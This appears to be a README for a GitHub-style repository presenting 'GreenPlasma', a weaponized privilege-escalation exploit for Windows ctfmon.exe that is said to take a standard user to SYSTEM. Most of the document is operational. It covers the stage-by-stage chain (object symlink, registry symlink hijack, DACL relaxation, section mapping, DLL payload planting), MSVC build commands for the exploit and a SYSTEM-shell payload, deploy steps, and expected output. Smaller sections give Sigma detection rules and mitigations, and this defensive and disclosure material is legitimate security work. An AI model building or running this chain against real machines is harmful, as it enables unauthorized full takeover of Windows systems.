# GreenPlasma

**CTFMON Arbitrary Section Creation Elevation of Privileges Vulnerability**

Windows 11 / Server 2022 / Server 2026

---

## Vulnerability Summary

GreenPlasma exploits a logic bug in `ctfmon.exe` (Windows Text Services Framework). A standard user can create an NT Object Manager symbolic link at the path where ctfmon creates its `CTF.AsmListCache` section object. When ctfmon restarts in an elevated (SYSTEM) context, it follows the symlink and creates the section at an attacker-controlled path with SYSTEM-level trust.

Combined with a registry symlink hijack (`CloudFiles\BlockedApps` → `Policies\System`) and DACL relaxation, this achieves **full local privilege escalation from standard user to SYSTEM** — no user interaction required.

## Repository Contents

| File | Description |
|------|-------------|
| `PoC.cpp` | Enhanced, fully commented exploit (7 stages + weaponization) |
| `payload.cpp` | SYSTEM shell DLL/EXE (3 techniques: token dup, named pipe, service) |
| `GreenPlasma.cpp` | Original source (stripped weaponization, as released by author) |
| `ANALYSIS.md` | Stage-by-stage technical breakdown + 4 weaponization paths |
| `MITIGATION.md` | Hardening recommendations + MSRC submission checklist |
| `detection/sigma-greenplasma.yml` | 3 Sigma detection rules |

## Exploit Chain

```
Standard User → Object Manager Symlink → Trigger ctfmon (SYSTEM) → 
Registry Symlink Hijack → DACL Relaxation → DisableLockWorkstation → 
Map SYSTEM Section → Write Payload → SYSTEM Shell
```

### Stage Breakdown

1. **Object Manager Symlink** — Redirect `CTF.AsmListCache.FMPWinlogon{SID}` to attacker-controlled target
2. **Ctfmon Elevation Trigger** — `CfAbortOperation` forces ctfmon restart as SYSTEM
3. **Wait for SYSTEM Section** — Poll until ctfmon creates the section at our symlink target
4. **Registry Symlink Hijack** — `CloudFiles\BlockedApps` → `Policies\System`
5. **DACL Relaxation** — Grant `Everyone: GENERIC_ALL` on hijacked registry keys
6. **DisableLockWorkstation** — Prevent lock screen via hijacked policy
7. **Map SYSTEM Section** — `NtMapViewOfSection` into attacker process (read/write)
8. **Weaponize** — Plant DLL path into section data → SYSTEM service loads payload

## Build & Run

### Prerequisites
- Windows 11 / Server 2022 / Server 2026
- Visual Studio (MSVC) with Windows SDK
- Standard user account (not Session 0)

### Build

> **Important:** The source files require Unicode (`W`) API variants. Both `UNICODE` and `_UNICODE` must be defined. The commands below include these flags. The `ntstatus.h` macro redefinition warnings are normal and harmless.

```batch
:: Build the main exploit (required: UNICODE flags + ntdll.lib)
cl /EHsc /DUNICODE /D_UNICODE /std:c++17 /Fe:GreenPlasma.exe PoC.cpp /link ntdll.lib advapi32.lib

:: Build the payload DLL (for section hijack weaponization)
cl /EHsc /DUNICODE /D_UNICODE /LD /Fe:greenplasma_payload.dll payload.cpp /link advapi32.lib shell32.lib

:: OR build payload as standalone EXE (for independent testing)
cl /EHsc /DUNICODE /D_UNICODE /DSTANDALONE_EXE /Fe:greenplasma_payload.exe payload.cpp /link advapi32.lib shell32.lib
```

> **Note:** The payload EXE requires SYSTEM privileges to spawn a shell. Running it as a standard user will simply report all three techniques failed and exit with code 1. The payload is designed to be loaded by the exploit via section hijack — use the PoC for actual privilege escalation.

> **Note:** The named pipe technique (Technique 2) has a 5-second timeout. If it doesn't connect in 5 seconds, it skips to Technique 3 (service-based). This prevents the payload from hanging indefinitely.

### Deploy

```batch
:: 1. Copy payload DLL to target path (matches path in PoC.cpp Stage 7)
copy greenplasma_payload.dll C:\Temp\greenplasma_payload.dll

:: 2. Run the exploit (standard user, interactive session)
PoC.exe

:: 3. Or with custom section target
PoC.exe \BaseNamedObjects\MyCustomTarget
```

### Expected Output

```
  =========================================================
  | GreenPlasma PoC - CTFMON Arbitrary Section Creation EoP |
  | For responsible disclosure / cyber exercise use only   |
  =========================================================

[*] Running in Session 2
[*] Section target: \BaseNamedObjects\CTFMON_DEAD

[Stage 1] Creating Object Manager symlink:
  Source: \Sessions\2\BaseNamedObjects\CTF.AsmListCache.FMPWinlogon2
  Target: \BaseNamedObjects\CTFMON_DEAD
  [OK] Symlink created successfully.

[Stage 2] Triggering ctfmon elevation via CfAbortOperation...
  [OK] CfAbortOperation called (trigger 1).
  [OK] Conhost launched (elevation trigger).

[Stage 3] Waiting for SYSTEM section creation...
  [OK] Section handle acquired: 0x00000ABC

[Stage 4] Creating registry symlink hijack...
  [OK] CloudFiles DACL relaxed (Everyone: GENERIC_ALL).
  [OK] Registry symlink created.
  [OK] Policies\System DACL relaxed (Everyone: GENERIC_ALL).

[Stage 5] Setting DisableLockWorkstation policy...
  [OK] DisableLockWorkstation = 1 set successfully.

[Stage 6] Mapping SYSTEM section into current process...
  [OK] Section mapped READ-WRITE at 0x00007FFF12340000 (size: 4096 bytes)

[Stage 7] WEAPONIZATION: Writing payload to SYSTEM section...
  [WEAPONIZE] Writing DLL path payload into section...
  [OK] DLL path written: C:\Temp\greenplasma_payload.dll

[*] Press any key to close section and clean up.
```

## Detection

See `detection/sigma-greenplasma.yml` for 3 Sigma rules:

| Rule | What it Detects |
|------|----------------|
| GreenPlasma Registry Symlink | `CloudFiles\BlockedApps\SymbolicLinkValue` modification |
| GreenPlasma Policy Hijack | `DisableLockWorkstation = 1` in HKCU Policies\System |
| GreenPlasma Object Symlink | `CTF.AsmListCache` symlink in Object Manager namespace |

Key indicators:
- `NtCreateSymbolicLinkObject` targeting `CTF.AsmListCache` paths
- `TreeSetNamedSecurityInfo` granting `Everyone: GENERIC_ALL` on CloudFiles or Policies keys
- `REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE` on `CloudFiles\BlockedApps`
- `DisableLockWorkstation = 1` in user policy (unusual in enterprise)

## Mitigation

See `MITIGATION.md` for full hardening recommendations including:
- Registry key DACL restrictions
- Object Manager namespace isolation
- Sysmon detection configuration
- Pre-patch workarounds

**Root Cause:** `ctfmon.exe` does not validate symbolic links before creating section objects. **Fix:** Add symlink checks in ctfmon's section creation path.

## Responsible Disclosure

This repository is for **security research, cyber exercises, and responsible disclosure** only.

**Do not use this exploit on systems you do not own or have authorization to test.**

## License

See [LICENSE](LICENSE) for the original repository license terms. All additions (PoC, payload, analysis, detection rules, mitigations) are provided for security research purposes.
